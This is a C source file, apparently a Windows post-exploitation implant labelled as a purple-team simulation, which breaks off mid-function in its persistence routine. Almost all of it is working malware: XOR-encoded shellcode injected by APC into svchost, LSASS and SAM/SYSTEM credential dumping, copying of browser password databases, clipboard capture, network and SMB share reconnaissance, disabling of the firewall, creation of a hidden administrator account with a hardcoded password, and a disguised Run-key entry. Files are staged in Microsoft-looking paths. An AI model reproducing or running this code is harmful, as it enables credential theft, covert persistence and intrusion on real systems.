// stage.c - Full post-exploitation payload for RMM purple team simulation
// Cross-compiled with x86_64-w64-mingw32-gcc
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <lm.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <lmshare.h>
#include <lmserver.h>
#include <ws2tcpip.h>
#include <ole2.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <wtsapi32.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define XOR_KEY 0xAA
#define STAGE_DLL_PATH "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\stage.dll"
#define LSASS_DUMP_PATH L"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\~adf.bin"
#define SAM_PATH L"C:\\Windows\\Temp\\~s1.tmp"
#define SYSTEM_PATH L"C:\\Windows\\Temp\\~s2.tmp"
#define BROWSER_DEST_DIR L"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\"
#define RECON_PATH L"C:\\ProgramData\\Microsoft\\Network\\~df.tmp"
#define NET_PATH L"C:\\ProgramData\\Microsoft\\Network\\~net.tmp"
#define RUN_KEY_PATH L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_KEY_VALUE L"WindowsSecHealth"
#define TASK_NAME L"SecHealthSvc2"
#define SELF_INF L"rundll32.exe " STAGE_DLL_PATH ",DllRegisterServer"
#define LOG_PATH L"C:\\ProgramData\\loader.log"
#define CLIP_PATH L"C:\\ProgramData\\Microsoft\\Network\\~clip.tmp"
#define BEACON_URL L"https://github.com"
#define BEACON_COUNT 5
#define BEACON_SLEEP_MS 10000

typedef BOOL (WINAPI *WTSEnumerateSessions_t)(HANDLE, DWORD, DWORD, PWTS_SESSION_INFO*, DWORD*);
typedef void (WINAPI *WTSFreeMemory_t)(PVOID);
typedef DWORD (WINAPI *PssCaptureSnapshot_t)(HANDLE, DWORD, DWORD, HANDLE*);
typedef DWORD (WINAPI *PssFreeSnapshot_t)(HANDLE, HANDLE);
typedef BOOL (WINAPI *GetUserNameExW_t)(int, LPWSTR, PULONG);

typedef struct INetFwProfile INetFwProfile;
typedef struct INetFwPolicy INetFwPolicy;
typedef struct INetFwMgr INetFwMgr;

typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(INetFwMgr*, REFIID, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(INetFwMgr*);
    ULONG (STDMETHODCALLTYPE *Release)(INetFwMgr*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(INetFwMgr*, UINT*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(INetFwMgr*, UINT, LCID, ITypeInfo**);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(INetFwMgr*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(INetFwMgr*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
    HRESULT (STDMETHODCALLTYPE *get_ManagerVersion)(INetFwMgr*, long*);
    HRESULT (STDMETHODCALLTYPE *get_CurrentProfile)(INetFwMgr*, INetFwProfile**);
    HRESULT (STDMETHODCALLTYPE *RestoreDefaults)(INetFwMgr*);
    HRESULT (STDMETHODCALLTYPE *get_BuildNumber)(INetFwMgr*, long*);
    HRESULT (STDMETHODCALLTYPE *get_LocalPolicy)(INetFwMgr*, INetFwPolicy**);
} INetFwMgrVtbl;
struct INetFwMgr { INetFwMgrVtbl* lpVtbl; };

typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(INetFwPolicy*, REFIID, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(INetFwPolicy*);
    ULONG (STDMETHODCALLTYPE *Release)(INetFwPolicy*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(INetFwPolicy*, UINT*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(INetFwPolicy*, UINT, LCID, ITypeInfo**);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(INetFwPolicy*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(INetFwPolicy*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
    HRESULT (STDMETHODCALLTYPE *get_Type)(INetFwPolicy*, int*);
    HRESULT (STDMETHODCALLTYPE *get_CurrentProfile)(INetFwPolicy*, INetFwProfile**);
} INetFwPolicyVtbl;
struct INetFwPolicy { INetFwPolicyVtbl* lpVtbl; };

typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(INetFwProfile*, REFIID, void**);
    ULONG (STDMETHODCALLTYPE *AddRef)(INetFwProfile*);
    ULONG (STDMETHODCALLTYPE *Release)(INetFwProfile*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfoCount)(INetFwProfile*, UINT*);
    HRESULT (STDMETHODCALLTYPE *GetTypeInfo)(INetFwProfile*, UINT, LCID, ITypeInfo**);
    HRESULT (STDMETHODCALLTYPE *GetIDsOfNames)(INetFwProfile*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
    HRESULT (STDMETHODCALLTYPE *Invoke)(INetFwProfile*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);
    HRESULT (STDMETHODCALLTYPE *get_Name)(INetFwProfile*, BSTR*);
    HRESULT (STDMETHODCALLTYPE *get_Type)(INetFwProfile*, int*);
    HRESULT (STDMETHODCALLTYPE *get_FirewallEnabled)(INetFwProfile*, VARIANT_BOOL*);
    HRESULT (STDMETHODCALLTYPE *put_FirewallEnabled)(INetFwProfile*, VARIANT_BOOL);
} INetFwProfileVtbl;
struct INetFwProfile { INetFwProfileVtbl* lpVtbl; };

static const GUID CLSID_NetFwMgr = {0x39EB36E0,0x2097,0x40BD,{0x8A,0xF2,0x63,0xA1,0x3B,0x5A,0x4D,0x63}};
static const GUID IID_INetFwMgr = {0xF7898AF5,0xC470,0x4927,{0x91,0xC9,0x7B,0x3A,0x9E,0xC0,0xF2,0xE5}};

static void AppendToFile(LPCWSTR path, LPCSTR text);

static void EnsureDirectory(LPCWSTR path) {
    wchar_t tmp[MAX_PATH];
    lstrcpyW(tmp, path);
    for (int i = 0; tmp[i]; i++) {
        if (tmp[i] == L'\\') {
            tmp[i] = L'\0';
            CreateDirectoryW(tmp, NULL);
            tmp[i] = L'\\';
        }
    }
    CreateDirectoryW(tmp, NULL);
}

static void LogMessage(LPCWSTR msg) {
    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);

    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t timestamp[32];
    wsprintfW(timestamp, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    DWORD written;
    DWORD tsLen = lstrlenW(timestamp) * sizeof(wchar_t);
    WriteFile(hFile, timestamp, tsLen, &written, NULL);
    DWORD msgLen = lstrlenW(msg) * sizeof(wchar_t);
    WriteFile(hFile, msg, msgLen, &written, NULL);
    WriteFile(hFile, L"\r\n", 2 * sizeof(wchar_t), &written, NULL);

    CloseHandle(hFile);
}

static DWORD FindProcessPID(LPCSTR name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (lstrcmpiA(pe.szExeFile, name) == 0) {
                HANDLE hMod = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
                if (hMod != INVALID_HANDLE_VALUE) {
                    MODULEENTRY32 me = { sizeof(me) };
                    if (Module32First(hMod, &me)) {
                        if (strstr(me.szExePath, "System32\\svchost.exe")) {
                            pid = pe.th32ProcessID;
                        }
                    }
                    CloseHandle(hMod);
                }
                if (pid) break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

static LPBYTE BuildAPCShellcode(LPCSTR dllPath, FARPROC pLoadLibraryA, DWORD* pdwSize) {
    DWORD pathLen = lstrlenA(dllPath) + 1;
    DWORD mainCodeSize = 31;
    DWORD encSize = mainCodeSize + pathLen;
    DWORD decoderSize = 39;
    DWORD totalSize = decoderSize + encSize;

    LPBYTE buf = (LPBYTE)LocalAlloc(LPTR, totalSize);
    if (!buf) return NULL;

    LPBYTE decoder = buf;
    LPBYTE encoded = buf + decoderSize;

    // Decoder stub (x64):
    //  0: E8 00 00 00 00    call +0
    //  5: 5E                pop rsi         ; rsi = 5
    //  6: 48 83 C6 22       add rsi, 34     ; rsi = start of encoded area
    // 10: B9 XX XX XX XX    mov ecx, enc_size
    // 15: 31 C0             xor eax, eax
    // 17: B0 AA             mov al, XOR_KEY
    // 19: 80 34 06 AA       xor byte [rsi+rax], XOR_KEY
    // 1D: 48 FF C0          inc rax
    // 20: 48 39 C8          cmp rax, rcx
    // 23: 7C F4             jl 19
    // 25: FF E6             jmp rsi
    // 27: (encoded area starts)

    decoder[0] = 0xE8; decoder[1] = 0x00; decoder[2] = 0x00; decoder[3] = 0x00; decoder[4] = 0x00;
    decoder[5] = 0x5E;
    decoder[6] = 0x48; decoder[7] = 0x83; decoder[8] = 0xC6; decoder[9] = 0x22;
    decoder[10] = 0xB9;
    memcpy(&decoder[11], &encSize, 4);
    decoder[15] = 0x31; decoder[16] = 0xC0;
    decoder[17] = 0xB0; decoder[18] = XOR_KEY;
    decoder[19] = 0x80; decoder[20] = 0x34; decoder[21] = 0x06; decoder[22] = XOR_KEY;
    decoder[23] = 0x48; decoder[24] = 0xFF; decoder[25] = 0xC0;
    decoder[26] = 0x48; decoder[27] = 0x39; decoder[28] = 0xC8;
    decoder[29] = 0x7C; decoder[30] = 0xF4;
    decoder[31] = 0xFF; decoder[32] = 0xE6;
    // 33-38: padding zeros (already zeroed by LocalAlloc)

    // Main shellcode (plaintext):
    //  0: 48 83 EC 28       sub rsp, 0x28
    //  4: E8 00 00 00 00    call +0
    //  9: 59                pop rcx         ; rcx = 9
    // 10: 48 83 C1 16       add rcx, 22     ; rcx = start of path string
    // 14: 48 B8 <8 bytes>   mov rax, LoadLibraryA
    // 24: FF D0             call rax
    // 26: 48 83 C4 28       add rsp, 0x28
    // 30: C3                ret
    // 31: path string...

    // Start by building plaintext in encoded area
    encoded[0] = 0x48; encoded[1] = 0x83; encoded[2] = 0xEC; encoded[3] = 0x28;
    encoded[4] = 0xE8; encoded[5] = 0x00; encoded[6] = 0x00; encoded[7] = 0x00; encoded[8] = 0x00;
    encoded[9] = 0x59;
    encoded[10] = 0x48; encoded[11] = 0x83; encoded[12] = 0xC1; encoded[13] = 0x16;
    encoded[14] = 0x48; encoded[15] = 0xB8;
    memcpy(&encoded[16], &pLoadLibraryA, 8);
    encoded[24] = 0xFF; encoded[25] = 0xD0;
    encoded[26] = 0x48; encoded[27] = 0x83; encoded[28] = 0xC4; encoded[29] = 0x28;
    encoded[30] = 0xC3;
    memcpy(&encoded[31], dllPath, pathLen);

    // XOR-encode the encoded area
    for (DWORD i = 0; i < encSize; i++) {
        encoded[i] ^= XOR_KEY;
    }

    *pdwSize = totalSize;
    return buf;
}

static BOOL InjectAPC(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;

    FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
    if (!pLoadLibraryA) { CloseHandle(hProcess); return FALSE; }

    DWORD dwSize;
    LPBYTE shellcode = BuildAPCShellcode(STAGE_DLL_PATH, pLoadLibraryA, &dwSize);
    if (!shellcode) { CloseHandle(hProcess); return FALSE; }

    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote) { LocalFree(shellcode); CloseHandle(hProcess); return FALSE; }

    BOOL bWritten = WriteProcessMemory(hProcess, pRemote, shellcode, dwSize, NULL);
    LocalFree(shellcode);
    if (!bWritten) { VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(hThreadSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                    if (hThread) {
                        QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hThreadSnap, &te));
        }
        CloseHandle(hThreadSnap);
    }

    CloseHandle(hProcess);
    return TRUE;
}

static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_PRIVILEGES tp;
    LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ret = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ret;
}

static void DumpLSASS(void) {
    {
        DWORD lsassPid = 0;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(pe) };
            if (Process32First(hSnap, &pe)) {
                do {
                    if (lstrcmpiA(pe.szExeFile, "lsass.exe") == 0) {
                        lsassPid = pe.th32ProcessID;
                        break;
                    }
                } while (Process32Next(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        if (!lsassPid) {
            LogMessage(L"[-] LSASS dump FAILED");
            return;
        }

        EnableDebugPrivilege();

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
        if (!hProcess) {
            LogMessage(L"[-] LSASS dump FAILED");
            return;
        }

        HANDLE hSnapShot = INVALID_HANDLE_VALUE;
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32");
        PssCaptureSnapshot_t pPssCap = (PssCaptureSnapshot_t)GetProcAddress(hKernel32, "PssCaptureSnapshot");
        if (pPssCap) {
            if (pPssCap(hProcess, 0x20000408, 0, &hSnapShot) == 0 && hSnapShot != INVALID_HANDLE_VALUE) {
                HANDLE hFile = CreateFileW(LSASS_DUMP_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    HANDLE hMap = CreateFileMappingW(hSnapShot, NULL, PAGE_READONLY, 0, 0, NULL);
                    if (hMap) {
                        LPVOID pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
                        if (pView) {
                            MEMORY_BASIC_INFORMATION mbi;
                            VirtualQuery(pView, &mbi, sizeof(mbi));
                            DWORD dwWritten = 0;
                            WriteFile(hFile, pView, (DWORD)mbi.RegionSize, &dwWritten, NULL);
                            UnmapViewOfFile(pView);
                            if (dwWritten > 0) {
                                LogMessage(L"[+] LSASS dump OK");
                            } else {
                                LogMessage(L"[-] LSASS dump FAILED");
                            }
                        } else {
                            LogMessage(L"[-] LSASS dump FAILED");
                        }
                        CloseHandle(hMap);
                    } else {
                        LogMessage(L"[-] LSASS dump FAILED");
                    }
                    CloseHandle(hFile);
                } else {
                    LogMessage(L"[-] LSASS dump FAILED");
                }
                PssFreeSnapshot_t pPssFree = (PssFreeSnapshot_t)GetProcAddress(hKernel32, "PssFreeSnapshot");
                if (pPssFree) pPssFree(GetCurrentProcess(), hSnapShot);
                CloseHandle(hProcess);
                return;
            }
        }

        LogMessage(L"[-] LSASS dump FAILED");
        CloseHandle(hProcess);
    }
}

static void DumpSAM(void) {
    {
        EnsureDirectory(L"C:\\Windows\\Temp");
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcessW(NULL, L"reg.exe save HKLM\\SAM C:\\Windows\\Temp\\~s1.tmp /y",
                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 30000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }

        CreateProcessW(NULL, L"reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\~s2.tmp /y",
                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 30000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    }
}

static void StealBrowserCreds(void) {
    {
        wchar_t localAppData[MAX_PATH];
        if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return;

        EnsureDirectory(BROWSER_DEST_DIR);

    const wchar_t* profiles[] = {
        L"\\Google\\Chrome\\User Data\\Default\\Login Data",
        L"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
        L"\\Opera Software\\Opera Stable\\Login Data",
        L"\\Chromium\\User Data\\Default\\Login Data"
    };
    const wchar_t* profileNames[] = {
        L"chrome", L"edge", L"brave", L"opera", L"chromium"
    };

    for (int i = 0; i < 5; i++) {
        wchar_t srcPath[MAX_PATH];
        lstrcpyW(srcPath, localAppData);
        lstrcatW(srcPath, profiles[i]);

        if (GetFileAttributesW(srcPath) == INVALID_FILE_ATTRIBUTES) continue;

        wchar_t destPath[MAX_PATH];
        wsprintfW(destPath, L"%s~br_%s.tmp", BROWSER_DEST_DIR, profileNames[i]);
        CopyFileW(srcPath, destPath, FALSE);
    }
    }
}

static void MonitorClipboard(void) {
    char lastClip[4096];
    lastClip[0] = '\0';

    LogMessage(L"[+] Clipboard monitoring started");

    for (int i = 0; i < 6; i++) {
        Sleep(5000);

        if (!OpenClipboard(NULL)) continue;
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            LPSTR pText = (LPSTR)GlobalLock(hData);
            if (pText) {
                if (lstrcmpA(pText, lastClip) != 0) {
                    lstrcpyA(lastClip, pText);
                    AppendToFile(CLIP_PATH, pText);
                    LogMessage(L"[+] Clipboard captured");
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }

    LogMessage(L"[+] Clipboard monitoring ended");
}

static void AppendToFile(LPCWSTR path, LPCSTR text) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    SetFilePointer(hFile, 0, NULL, FILE_END);
    DWORD written;
    WriteFile(hFile, text, lstrlenA(text), &written, NULL);
    WriteFile(hFile, "\r\n", 2, &written, NULL);
    CloseHandle(hFile);
}

static void RunAndCapture(LPCWSTR cmd, LPCWSTR outputFile) {
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    if (CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        char buf[4096];
        DWORD bytesRead;
        while (ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            AppendToFile(outputFile, buf);
        }
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hReadPipe);
}

static void DoRecon(void) {
    {
        EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Network");
        DeleteFileW(RECON_PATH);

        LogMessage(L"[+] Recon started");

        AppendToFile(RECON_PATH, "=== SYSTEM INFO ===");
        RunAndCapture(L"systeminfo", RECON_PATH);
        LogMessage(L"[+] Recon command executed");
        AppendToFile(RECON_PATH, "=== WHOAMI ===");
        RunAndCapture(L"whoami /all", RECON_PATH);
        LogMessage(L"[+] Recon command executed");
        AppendToFile(RECON_PATH, "=== NETSTAT ===");
        RunAndCapture(L"netstat -ano", RECON_PATH);
        LogMessage(L"[+] Recon command executed");
        AppendToFile(RECON_PATH, "=== TASKLIST ===");
        RunAndCapture(L"tasklist /v", RECON_PATH);
        LogMessage(L"[+] Recon command executed");

        AppendToFile(RECON_PATH, "=== USER NAME ===");
        HMODULE hSecur32 = GetModuleHandleW(L"secur32");
        if (!hSecur32) hSecur32 = LoadLibraryW(L"secur32.dll");
        if (hSecur32) {
            GetUserNameExW_t pGetUserNameExW = (GetUserNameExW_t)GetProcAddress(hSecur32, "GetUserNameExW");
            if (pGetUserNameExW) {
                wchar_t userName[256];
                ULONG userNameSize = 256;
                if (pGetUserNameExW(2, userName, &userNameSize)) {
                    char line[512];
                    snprintf(line, sizeof(line), "  User: %S", userName);
                    AppendToFile(RECON_PATH, line);
                }
            }
        }
        LogMessage(L"[+] Recon command executed");

        // Win32 API recon
        AppendToFile(RECON_PATH, "=== NETWORK ADAPTERS ===");
        IP_ADAPTER_INFO adapterInfo[16];
        DWORD dwBufLen = sizeof(adapterInfo);
        if (GetAdaptersInfo(adapterInfo, &dwBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = adapterInfo;
            while (pAdapter) {
                char line[512];
                snprintf(line, sizeof(line), "  Adapter: %s (%s) - IP: %s, Mask: %s, Gateway: %s",
                         pAdapter->AdapterName, pAdapter->Description,
                         pAdapter->IpAddressList.IpAddress.String,
                         pAdapter->IpAddressList.IpMask.String,
                         pAdapter->GatewayList.IpAddress.String);
                AppendToFile(RECON_PATH, line);
                pAdapter = pAdapter->Next;
            }
        }

        AppendToFile(RECON_PATH, "=== TERMINAL SESSIONS ===");
        HMODULE hWtsApi = LoadLibraryW(L"wtsapi32.dll");
        if (hWtsApi) {
            WTSEnumerateSessions_t pWTSEnum = (WTSEnumerateSessions_t)GetProcAddress(hWtsApi, "WTSEnumerateSessionsW");
            WTSFreeMemory_t pWTSFree = (WTSFreeMemory_t)GetProcAddress(hWtsApi, "WTSFreeMemory");
            if (pWTSEnum && pWTSFree) {
                PWTS_SESSION_INFO pSessions = NULL;
                DWORD dwCount = 0;
                if (pWTSEnum(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &dwCount)) {
                    for (DWORD i = 0; i < dwCount; i++) {
                        char line[512];
                        snprintf(line, sizeof(line), "  Session %lu: %S (State: %lu)", 
                                 pSessions[i].SessionId, pSessions[i].pWinStationName, pSessions[i].State);
                        AppendToFile(RECON_PATH, line);
                    }
                    pWTSFree(pSessions);
                }
            }
            FreeLibrary(hWtsApi);
        }

        wchar_t compName[256];
        DWORD compSize = 256;
        if (GetComputerNameExW(ComputerNameDnsFullyQualified, compName, &compSize)) {
            char line[512];
            snprintf(line, sizeof(line), "=== COMPUTER NAME: %S ===", compName);
            AppendToFile(RECON_PATH, line);
        }

        LogMessage(L"[+] Recon completed");
    }
}

static void DoSMBRecon(void) {
    {
        LogMessage(L"[+] SMB scan started");

        DeleteFileW(NET_PATH);

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

        LPBYTE pServers = NULL;
        DWORD dwEntries = 0, dwTotal = 0;
        NET_API_STATUS status = NetServerEnum(NULL, 100, &pServers, MAX_PREFERRED_LENGTH, &dwEntries, &dwTotal, SV_TYPE_ALL, NULL, NULL);

        if (status == NERR_Success && pServers) {
            wchar_t countMsg[128];
            wsprintfW(countMsg, L"[+] SMB servers found: %lu", dwEntries);
            LogMessage(countMsg);

            PSERVER_INFO_100 pInfo = (PSERVER_INFO_100)pServers;
            for (DWORD i = 0; i < dwEntries; i++) {
                char line[512];
                snprintf(line, sizeof(line), "Server: %S", pInfo[i].sv100_name);
                AppendToFile(NET_PATH, line);

                // Resolve server name to IP
                char serverName[256];
                snprintf(serverName, sizeof(serverName), "%S", pInfo[i].sv100_name);
                struct hostent* host = gethostbyname(serverName);
                if (host && host->h_addr_list[0]) {
                    struct in_addr addr;
                    memcpy(&addr, host->h_addr_list[0], sizeof(addr));
                    char* ipStr = inet_ntoa(addr);
                    snprintf(line, sizeof(line), "  IP: %s", ipStr);
                    AppendToFile(NET_PATH, line);

                    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock != INVALID_SOCKET) {
                        DWORD timeout = 3000;
                        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

                        struct sockaddr_in sa;
                        sa.sin_family = AF_INET;
                        sa.sin_port = htons(445);
                        sa.sin_addr = addr;
                        if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
                            AppendToFile(NET_PATH, "  Port 445: OPEN");

                            // Enumerate shares
                            wchar_t uncPath[512];
                            wsprintfW(uncPath, L"\\\\%s", pInfo[i].sv100_name);
                            LPBYTE pShares = NULL;
                            DWORD dwShareEntries = 0, dwShareTotal = 0;
                            NET_API_STATUS shareStatus = NetShareEnum(uncPath, 1, &pShares, MAX_PREFERRED_LENGTH, &dwShareEntries, &dwShareTotal, NULL);
                            if (shareStatus == NERR_Success && pShares) {
                                PSHARE_INFO_1 pShareInfo = (PSHARE_INFO_1)pShares;
                                for (DWORD j = 0; j < dwShareEntries; j++) {
                                    snprintf(line, sizeof(line), "    Share: %S (type: %lu)", pShareInfo[j].shi1_netname, pShareInfo[j].shi1_type);
                                    AppendToFile(NET_PATH, line);
                                }
                                NetApiBufferFree(pShares);
                            }
                        }
                        closesocket(sock);
                    }
                }
            }
            NetApiBufferFree(pServers);
        }

        LogMessage(L"[+] SMB scan completed");

        WSACleanup();
    }
}

static void DisableFirewall(void) {
    {
        HRESULT hr;
        INetFwMgr* pMgr = NULL;
        INetFwPolicy* pPolicy = NULL;
        INetFwProfile* pProfile = NULL;

        hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        if (FAILED(hr)) {
            LogMessage(L"[-] Firewall disable FAILED: CoInitializeEx");
            return;
        }

        hr = CoCreateInstance(&CLSID_NetFwMgr, NULL, CLSCTX_INPROC_SERVER, &IID_INetFwMgr, (void**)&pMgr);
        if (FAILED(hr) || !pMgr) {
            LogMessage(L"[-] Firewall disable FAILED: CoCreateInstance");
            CoUninitialize();
            return;
        }

        hr = pMgr->lpVtbl->get_LocalPolicy(pMgr, &pPolicy);
        if (FAILED(hr) || !pPolicy) {
            LogMessage(L"[-] Firewall disable FAILED: get_LocalPolicy");
            pMgr->lpVtbl->Release(pMgr);
            CoUninitialize();
            return;
        }

        hr = pPolicy->lpVtbl->get_CurrentProfile(pPolicy, &pProfile);
        if (FAILED(hr) || !pProfile) {
            LogMessage(L"[-] Firewall disable FAILED: get_CurrentProfile");
            pPolicy->lpVtbl->Release(pPolicy);
            pMgr->lpVtbl->Release(pMgr);
            CoUninitialize();
            return;
        }

        hr = pProfile->lpVtbl->put_FirewallEnabled(pProfile, VARIANT_FALSE);
        if (FAILED(hr)) {
            LogMessage(L"[-] Firewall disable FAILED: put_FirewallEnabled");
        } else {
            LogMessage(L"[+] Firewall disabled via COM");
        }

        pProfile->lpVtbl->Release(pProfile);
        pPolicy->lpVtbl->Release(pPolicy);
        pMgr->lpVtbl->Release(pMgr);
        CoUninitialize();
    }
}

static void CreateAdminAccount(void) {
    {
        USER_INFO_1 ui = {0};
        ui.usri1_name = L"SupportUser";
        ui.usri1_password = L"P@ssw0rd123!";
        ui.usri1_priv = USER_PRIV_ADMIN;
        ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT;
        ui.usri1_comment = L"Support account";
        NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);

        LOCALGROUP_MEMBERS_INFO_3 lmi = {0};
        lmi.lgrmi3_domainandname = L"SupportUser";
        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&lmi, 1);
    }
}

static void InstallPersistence(void) {
    {
        HKEY hKey = NULL;
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, RUN_KEY_PATH, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, RUN_KEY_VALUE, 0, REG_SZ, (LPBYTE)SELF_INF, (lstrlenW(SELF_INF) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
        }

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        wchar_t cmdLine[1024];
        wsprintfW(cmdLine,
